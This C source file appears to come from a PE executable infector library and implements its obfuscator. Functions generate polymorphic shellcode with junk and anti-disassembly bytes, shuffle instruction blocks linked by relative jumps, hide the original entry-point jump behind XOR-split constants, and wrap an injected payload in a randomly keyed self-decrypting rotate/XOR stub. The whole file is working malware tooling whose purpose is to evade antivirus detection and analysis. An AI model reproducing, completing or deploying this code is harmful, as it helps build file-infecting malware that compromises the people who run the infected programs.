/*
 * \file   libpeinfect_obfuscator.c
 * \brief  peinfect obfuscator sub-library
 */

/* ToDo: additional Anti-Debugging */

#include "libpefile.h"
#include "libpeinfect_obfuscator.h"

/* Shellcode type */
typedef enum _SHELLCODE_TYPE {
  TYPE_CMD = 0x01,  // CMD type
  TYPE_CALL = 0x02, // CAll type
  TYPE_JMP = 0x03,  // JMP type
  TYPE_LOOP = 0x04, // LOOP type
} SHELLCODE_TYPE;

/* Std OpCodes */
typedef enum _OPCODE {
  OP_JMP = '\xeb', // JMP opcode
  OP_LOOP = '\xe2', // LOOP opcode
  OP_CALL = '\xe8', // CALL opcode
} OPCODE;

/* Shellcode Entry Holder */
typedef struct _SHELLCODE_ENTRY {
  unsigned char *code;    // Shellcode to insert
  size_t codesize;        // Shellcode size
  unsigned char *garbage; // Garbage to insert
  size_t garbagesize;     // Garbage size
  size_t index;           // Index of entry
  size_t target;          // Target entry (for jmp types)
  SHELLCODE_TYPE type;    // Entry type
} SHELLCODE_ENTRY;

/* Shellcode */
typedef struct _SHELLCODE {
  SHELLCODE_ENTRY *entry; // Entrys
  size_t entrys;          // Entry counter
  size_t total_size;      // Total shellcode size
  bool x64;               // x64 Mode
  bool fix_last;          // don't shuffle last entry
} SHELLCODE;

/* Generate garbage */
static  unsigned char* __peinfector_obfuscator_generate_garbage(SHELLCODE *shellcode, size_t *size) {
  unsigned char *garbage = NULL;
  switch (shellcode->x64 ? (2 + rand() % 3) : (rand() % 5)) {
    /* Break alignment */
    case 0:
    case 1:
      *size = 4;
      garbage = malloc(*size);
      if (garbage == NULL) {
        *size = 0;
        return NULL;
      }
      memcpy(garbage, "\xeb\xff\xc0\x48", *size);
      break;

      /* Random garbage */
    case 2:
      *size = 3 + rand() % 6;
      garbage = malloc(*size);
      if (garbage == NULL) {
        *size = 0;
        return NULL;
      }
      garbage[0] = '\xeb';
      garbage[1] = (unsigned char) ((int) *size - (int) 2);
      break;

      /* NOPs */
    case 3:
      *size = 1 + rand() % 2;
      garbage = malloc(*size);
      if (garbage == NULL) {
        *size = 0;
        return NULL;
      }
      memset(garbage, '\x90', *size);
      break;

      /* Nothing */
    default:
      *size = 0;
      garbage = NULL;
  }

  return garbage;
}

/* Shuffles array */
static void __peinfector_obfuscator_shuffle(void *array, size_t n, size_t size) {
  char *tmp;
  tmp = malloc(size);

  char *arr = array;
  size_t stride = size * sizeof(char);

  if (n > 1) {
    size_t i;
    for (i = 0; i < n - 1; ++i) {
      size_t rnd = (size_t) rand();
      size_t j = i + rnd / (RAND_MAX / (n - i) + 1);

      memcpy(tmp, arr + j * stride, size);
      memcpy(arr + j * stride, arr + i * stride, size);
      memcpy(arr + i * stride, tmp, size);
    }
  }
}

/* Generate new shellcode */
static  SHELLCODE* __peinfector_obfuscator_shellcode_new() {
  SHELLCODE *shellcode = calloc(1, sizeof(SHELLCODE));

  return shellcode;
}

/* Sets x64 mode */
static  void __peinfector_obfuscator_shellcode_set_x64(SHELLCODE *shellcode, bool _x64) {
  shellcode->x64 = _x64;
}

/* Sets fix last mode (Doesn't shuffle last Entry) */
static  void __peinfector_obfuscator_shellcode_fix_last(SHELLCODE *shellcode, bool fix_last) {
  shellcode->fix_last = fix_last;
}

/* Generate new shellcode */
static  void __peinfector_obfuscator_shellcode_free(SHELLCODE *shellcode) {
  size_t i = 0;
  /* Free code and garbage */
  for (i = 0; i < shellcode->entrys; ++i) {
    /* Free each code */
    if (shellcode->entry[i].code != 0) {
      free(shellcode->entry[i].code);
    }
    /* Free each garbage */
    if (shellcode->entry[i].garbage != 0) {
      free(shellcode->entry[i].garbage);
    }
  }

  /* Free holder*/
  free(shellcode->entry);

  /* Free shellcode container*/
  free(shellcode);
}

/* Add shellcode entry */
static  int __peinfector_obfuscator_shellcode_add_entry(SHELLCODE *shellcode, char *code, size_t codesize,
bool add_garbage) {
  SHELLCODE_ENTRY *entry = NULL;

  /* Add entry */
  shellcode->entry = realloc(shellcode->entry, (shellcode->entrys + 1) * sizeof(SHELLCODE_ENTRY));
  if (shellcode->entry == NULL) {
    return -1;
  }
  memset(&shellcode->entry[shellcode->entrys], 0, sizeof(SHELLCODE_ENTRY));
   entry = (SHELLCODE_ENTRY*) &shellcode->entry[shellcode->entrys];

  /* Set Entry */
  entry->index = shellcode->entrys;
  entry->code = malloc(codesize);
  entry->codesize = codesize;
  entry->type = TYPE_CMD;
  entry->target = shellcode->entrys + 1;
  if (entry->code == NULL) {
    return -1;
  }
  memcpy(entry->code, code, codesize);

  /* Add garbage */
  if (add_garbage) {
    entry->garbage = __peinfector_obfuscator_generate_garbage(shellcode, &entry->garbagesize);
  }

  /* Increase size */
  shellcode->total_size += entry->garbagesize + entry->codesize;

  /* Increase entry counter*/
  shellcode->entrys++;

  /* Return entry index */
  return (int)shellcode->entrys - 1;
}

/* Add shellcode jmp/loop/call */
static  int __peinfector_obfuscator_shellcode_add_generic_jmp(SHELLCODE *shellcode, SHELLCODE_TYPE type,
    size_t size_correction, size_t target, bool add_garbage) {
  SHELLCODE_ENTRY *entry = NULL;

  /* Add entry */
  shellcode->entry = realloc(shellcode->entry, (shellcode->entrys + 1) * sizeof(SHELLCODE_ENTRY));
  if (shellcode->entry == NULL) {
    return -1;
  }
  memset(&shellcode->entry[shellcode->entrys], 0, sizeof(SHELLCODE_ENTRY));
  entry = (SHELLCODE_ENTRY*) &shellcode->entry[shellcode->entrys];

  /* Set Entry */
  entry->index = shellcode->entrys;
  entry->codesize = size_correction;
  entry->target = target;
  entry->type = type;

  /* Add garbage */
  if (add_garbage) {
    entry->garbage = __peinfector_obfuscator_generate_garbage(shellcode, &entry->garbagesize);
  }

  /* Increase size */
  shellcode->total_size += entry->garbagesize + entry->codesize;

  /* Increase entry counter*/
  shellcode->entrys++;

  /* Return entry index */
  return (int)shellcode->entrys - 1;
}

/* Add JMP Entry*/
static  int __peinfector_obfuscator_shellcode_add_jmp(SHELLCODE *shellcode, size_t target, bool add_garbage) {

  return __peinfector_obfuscator_shellcode_add_generic_jmp(shellcode, TYPE_JMP, 0, target, add_garbage);
}

/* Add LOOP Entry*/
static  int __peinfector_obfuscator_shellcode_add_loop(SHELLCODE *shellcode, size_t target, bool add_garbage) {

  return __peinfector_obfuscator_shellcode_add_generic_jmp(shellcode, TYPE_LOOP, 2, target, add_garbage);
}

/* Add CALL Entry*/
static  int __peinfector_obfuscator_shellcode_add_call(SHELLCODE *shellcode, size_t target, bool add_garbage) {

  return __peinfector_obfuscator_shellcode_add_generic_jmp(shellcode, TYPE_CALL, 3, target, add_garbage);
}

/* get jmp position of entry */
static  int __peinfector_obfuscator_shellcode_get_jmp_pos(SHELLCODE *shellcode, int entry) {
  size_t pos = 0;
  size_t i = 0;

  if (entry == -1) {
    return 0;
  }

  /* Find position to insert JMP after shuffling */
  pos = 2;
  for (i = 0; i < shellcode->entrys; ++i) {
    pos += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);
    if (shellcode->entry[i].index == entry) {
      /* Correct position (CALL 5, LOOP 4, all other 2) */
      pos -= (shellcode->entry[i].type == TYPE_CALL) ? 5 : ((shellcode->entry[i].type == TYPE_LOOP) ? 4 : 2);
      break;
    }
  }

  return (int)pos;
}

/* Calculates delta between 2 entrys (end entry 1 -> start entry 2) */
static  int __peinfector_obfuscator_shellcode_find_delta(SHELLCODE *shellcode, uint32_t size, int entry1,
    int entry2) {
  size_t i = 0;
  size_t pos_1 = 0;
  size_t pos_2 = 0;

  /* End of entry 1*/
  if (entry1 == -1) {
    pos_1 = 2;
  } else {
    pos_1 = 2;
    for (i = 0; i < shellcode->entrys; ++i) {
      pos_1 += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);
      if (shellcode->entry[i].index == entry1) {
        break;
      }
    }
  }

  /* Start of entry 2*/
  if ((entry2 == -1) || (entry2 == shellcode->entrys)) {
    pos_2 = size;
  } else {
    pos_2 = 2;
    for (i = 0; i < shellcode->entrys; ++i) {
      if (shellcode->entry[i].index == entry2) {
        break;
      }
      pos_2 += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);
    }
  }

  /* Return delta position */
  return (int)pos_2 - (int)pos_1;
}

static  void __peinfector_obfuscator_build_relative_jmp(unsigned char *shellcode, uint32_t pos, OPCODE opcode,
    int jmp_delta) {

  shellcode[pos] = opcode;

  /* Relative target */
  if ((jmp_delta == 0) && (opcode != OP_LOOP)) {
    /* NOP */
    if (opcode == OP_CALL) {
      memset(&shellcode[pos], 0x90, 5);
    } else {
      memset(&shellcode[pos], 0x90, 2);
    }
    /* jmp forward */
  } else if (jmp_delta > 0) {
    if (opcode == OP_LOOP) {
      jmp_delta += 4;
    }
    shellcode[pos + 1] = (unsigned char) jmp_delta;
    if (opcode == OP_CALL) {
      memset(&shellcode[pos + 2], 0x00, 3);
    }
    /* jmp backward */
  } else {
    if (opcode == OP_LOOP) {
      jmp_delta += 4;
    }
    shellcode[pos + 1] = (unsigned char) ((int) 0xfe + (int) (jmp_delta + 2));
    if (opcode == OP_CALL) {
      memset(&shellcode[pos + 2], 0xff, 3);
    }
  }
}

/* Generates new randomized shellcode */
static  unsigned char* __peinfector_obfuscator_shellcode_generate(SHELLCODE *shellcode, size_t *size) {
  int i = 0;
  uint32_t pos = 0;
  uint32_t jmp_pos = 0;
  int jmp_delta = 0;
  unsigned char *shellcode_buf = NULL;

  /* Shuffle entrys */
  __peinfector_obfuscator_shuffle(shellcode->entry, (shellcode->entrys - (shellcode->fix_last ? 1 : 0)),
      sizeof(SHELLCODE_ENTRY));

  /* Calculate size */
  *size = ((shellcode->entrys + 1) * 2) + shellcode->total_size;

  /* Allocate shellcode */
  shellcode_buf = malloc(*size);
  if (shellcode_buf == NULL) {
    return NULL;
  }

  /* Jump to 0 entry */
  jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, (uint32_t)*size, -1, 0);
  __peinfector_obfuscator_build_relative_jmp(shellcode_buf, 0, OP_JMP, jmp_delta);
  pos = 2;

  /* Write shellcode, garbage and jmps  */
  for (i = 0; i < (int) shellcode->entrys; ++i) {
    /* Write payload data*/
    /* Write garbage */
    if (shellcode->entry[i].garbage != NULL) {
      memcpy(shellcode_buf + pos, shellcode->entry[i].garbage, shellcode->entry[i].garbagesize);
    }
    pos += (uint32_t)shellcode->entry[i].garbagesize;

    /* Write shellcode data */
    if (shellcode->entry[i].code != NULL) {
      memcpy(shellcode_buf + pos, shellcode->entry[i].code, shellcode->entry[i].codesize);
    }
    pos += (uint32_t)shellcode->entry[i].codesize + 2;

    /* Write jmps */
    /* Position of jmp cmd */
    jmp_pos = __peinfector_obfuscator_shellcode_get_jmp_pos(shellcode, (int)shellcode->entry[i].index);
    /* Difference to next entry */
    jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, (uint32_t)*size, (int)shellcode->entry[i].index,
        (int)shellcode->entry[i].target);

    switch (shellcode->entry[i].type) {
      case TYPE_CMD:
      case TYPE_JMP:
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_JMP, jmp_delta);
        break;
      case TYPE_LOOP:
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_LOOP, jmp_delta - 2);
        jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, (uint32_t)*size, (int)shellcode->entry[i].index,
            (int)shellcode->entry[i].index + 1);
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos + 2, OP_JMP, jmp_delta);
        break;
      case TYPE_CALL:
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_CALL, jmp_delta);
        break;
    }
  }

  /* Return result */
  return shellcode_buf;
}

/* Random uint32 */
static  uint32_t __peinfect_obfuscator_random_uint32() {
  uint32_t i, p;
  p = rand();
  for (i = 0; i < 2; ++i) {
    p <<= 16;
    p |= rand();
  }
  return p;
}

/* Build XOR pair for value, 32 bit*/
static  void __peinfect_obfuscator_build_xor_pair_x86(uint32_t value, uint32_t *p1, uint32_t *p2) {
  uint32_t i;
  *p1 = rand();
  for (i = 0; i < 2; ++i) {
    *p1 <<= 16;
    *p1 |= rand();
  }
  *p2 = value ^ *p1;
}

/* Build XOR pair for value, 64 bit*/
static  void __peinfect_obfuscator_build_xor_pair_x64(uint64_t value, uint64_t *p1, uint64_t *p2) {
  uint32_t i;
  *p1 = rand();
  for (i = 0; i < 4; ++i) {
    *p1 <<= 16;
    *p1 |= rand();
  }
  *p2 = value ^ *p1;
}

unsigned char* peinfect_obfuscator_build_ep_jmp(PEFILE *pe, size_t *jmpsize) {
  uint32_t ep_x86, p1_x86, p2_x86;
  uint64_t ep_x64, p1_x64, p2_x64;
  unsigned char *jmp_payload = NULL;
  static bool add_garbage = true;
  bool error = true;
  char tmp[10] = { 0 };

  /* Takes EntryPoint (ep) and generates an random value p1 and p2 = ep xor
   *
   * Then polymorphic engine creates obfuscated version of the following assembly.
   *
   * ASM: (x64: rax, rbx) (Could be done with less commands, but with more commands
   * the polymorphic engine can create more variants)
   *
   * mov eax, p1
   * mov ebx, p2
   * xor eax, ebx
   * xor ebx, ebx
   * push eax
   * xor eax
   * retn
   */

  /* Shellcode obfuscator engine */
  SHELLCODE *shellcode = __peinfector_obfuscator_shellcode_new();
  if (shellcode == NULL) {
    return NULL;
  }

  /* Cruel solution, but keeps code clean */
  for (;;) {
    /* Get entry point (VA, not RVA) and build hidden jmp */
    if (pe->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      ep_x86 = pe->optional_header_32.ImageBase + pe->optional_header_32.AddressOfEntryPoint;
      /* Build XOR pair*/
      __peinfect_obfuscator_build_xor_pair_x86(ep_x86, &p1_x86, &p2_x86);

      /* Build return x86 */
      /* mov eax, p1*/
      tmp[0] = '\xb8';
      memcpy(tmp + 1, &p1_x86, sizeof(uint32_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
        break;
      }

      /* mov ebx, p2*/
      tmp[0] = '\xbb';
      memcpy(tmp + 1, &p2_x86, sizeof(uint32_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
        break;
      }

      /* xor eax, ebx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x31\xd8", 2, add_garbage) < 0) {
        break;
      }
      /* xor ebx, ebx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x31\xdb", 2, add_garbage) < 0) {
        break;
      }
      /* push eax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x50", 1, add_garbage) < 0) {
        break;
      }
      /* xor eax, eax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x31\xc0", 2, add_garbage) < 0) {
        break;
      }
      /* ret*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\xc3", 1, add_garbage) < 0) {
        break;
      }

    } else {
      ep_x64 = pe->optional_header_64.ImageBase + pe->optional_header_64.AddressOfEntryPoint;
      /* Build XOR pair*/
      __peinfect_obfuscator_build_xor_pair_x64(ep_x64, &p1_x64, &p2_x64);

      /* x64 Mode (Some garbage entrys are not allowed) */
      __peinfector_obfuscator_shellcode_set_x64(shellcode, true);

      /* Build return x64 */
      /* mov rax, p1*/
      tmp[0] = '\x48';
      tmp[1] = '\xb8';
      memcpy(tmp + 2, &p1_x64, sizeof(uint64_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 10, add_garbage) < 0) {
        break;
      }

      /* mov rbx, p2*/
      tmp[1] = '\xbb';
      memcpy(tmp + 2, &p2_x64, sizeof(uint64_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 10, add_garbage) < 0) {
        break;
      }

      /* xor rax, rbx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x48\x31\xd8", 3, add_garbage) < 0) {
        break;
      }
      /* xor rbx, rbx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x48\x31\xdb", 3, add_garbage) < 0) {
        break;
      }
      /* push rax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x50", 1, add_garbage) < 0) {
        break;
      }
      /* xor rax, rax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x48\x31\xc0", 3, add_garbage) < 0) {
        break;
      }
      /* ret*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\xc3", 1, add_garbage) < 0) {
        break;
      }
    }

    /* Everything ok */
    error = false;
    break;
  }

  /* Generate */
  if (!error) {
    jmp_payload = __peinfector_obfuscator_shellcode_generate(shellcode, jmpsize);
  }

  /* Free shellcode obfuscator engine */
  __peinfector_obfuscator_shellcode_free(shellcode);

  return jmp_payload;
}

unsigned char* peinfect_obfuscator_encrypt_payload(unsigned char *payload, size_t payloadsize, size_t *decryptersize,
bool x64) {
  bool add_garbage = false; /* temp. disable garbage insertion because of errors on x86 plattform */
  bool error = true;
  size_t i = 0;
  size_t totalsize = 0;
  unsigned char *decrypter = NULL;
  unsigned char *encrypted = NULL;
  char tmp[10] = { 0 };
  int label_decode = 0;
  int label_getaddr = 0;
  /* Random keys (rnd1 = bit-shift, rnd2 = xor) */
  unsigned char rnd1 = (unsigned char) ((int) 1 + __peinfect_obfuscator_random_uint32() % 7);
  unsigned char rnd2 = (unsigned char) ((int) 1 + __peinfect_obfuscator_random_uint32() % 255);

  /*
   * x86/x64 produces the same code
   *
   * _start:
   * jmp short encoded    ; Load Address
   * getaddr:
   * pop ebx              ; stores data
   * mov ecx, xxxxxxxx    ; shellcode size
   * decode:
   * ror byte ptr [ecx + ebx - 1], rnd  ; Random Bit Rotate
   * xor byte ptr [ecx + ebx - 1], rnd2 ; Random XOr
   * loop short decode
   *
   * jmp ebx ; jmp to shellcode
   * encoded:
   * call getaddr
   * ; Shellcode
   * end _start
   */

  /* Shellcode obfuscator engine */
  SHELLCODE *shellcode = __peinfector_obfuscator_shellcode_new();
  if (shellcode == NULL) {
    return NULL;
  }

  /* x64 Mode (Some garbage entrys are not allowed) */
  __peinfector_obfuscator_shellcode_set_x64(shellcode, x64);

  /* Last command must be at last position */
  __peinfector_obfuscator_shellcode_fix_last(shellcode, true);

  for (;;) {
    /* jmp encoded */
    if (__peinfector_obfuscator_shellcode_add_jmp(shellcode, 7, add_garbage) < 0) {
      break;
    }
    /* getaddr: */
    /* pop ebx */
    if ((label_getaddr = __peinfector_obfuscator_shellcode_add_entry(shellcode, "\x5b", 1, add_garbage)) < 0) {
      break;
    }
    /* set ecx, length */
    tmp[0] = '\xb9';
    memcpy(&tmp[1], &payloadsize, sizeof(uint32_t));
    if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
      break;
    }
    /* decode: */
    /* ror byte ptr [ecx + ebx - 1], rn1 */
    tmp[4] = rnd1;
    memcpy(&tmp[0], "\xc0\x4c\x0b\xff", 4);
    if ((label_decode = __peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage)) < 0) {
      break;
    }
    /* xor byte ptr [ecx + ebx - 1], rnd2 */
    tmp[4] = rnd2;
    memcpy(&tmp[0], "\x80\x74\x19\xff", 4);
    if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
      break;
    }
    /* loop decode */
    if (__peinfector_obfuscator_shellcode_add_loop(shellcode, label_decode, add_garbage) < 0) {
      break;
    }
    /* jmp ebx */
    if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\xff\xe3", 2, add_garbage) < 0) {
      break;
    }
    /* encoded: */
    /* call getaddr */
    if (__peinfector_obfuscator_shellcode_add_call(shellcode, label_getaddr, add_garbage) < 0) {
      break;
    }

    error = false;
    break;
  }

  /* Generate */
  if (!error) {
    decrypter = __peinfector_obfuscator_shellcode_generate(shellcode, decryptersize);
  }

  /* Free shellcode obfuscator engine */
  __peinfector_obfuscator_shellcode_free(shellcode);

  /* Add payload */
  if (decrypter != NULL) {
    /* Add payload and encode */
    totalsize = *decryptersize + payloadsize;
    encrypted = realloc(decrypter, *decryptersize + payloadsize);
    if (encrypted == NULL) {
      free(decrypter);
      return NULL;
    }
    memcpy(encrypted + *decryptersize, payload, payloadsize);

    /* Encode */
    for (i = *decryptersize; i < totalsize; ++i) {
      encrypted[i] ^= rnd2;
      encrypted[i] = ((encrypted[i] << rnd1) | (encrypted[i] >> (8 - rnd1))) & 0xff;
    }
    *decryptersize = totalsize;
  }

  return encrypted;
}
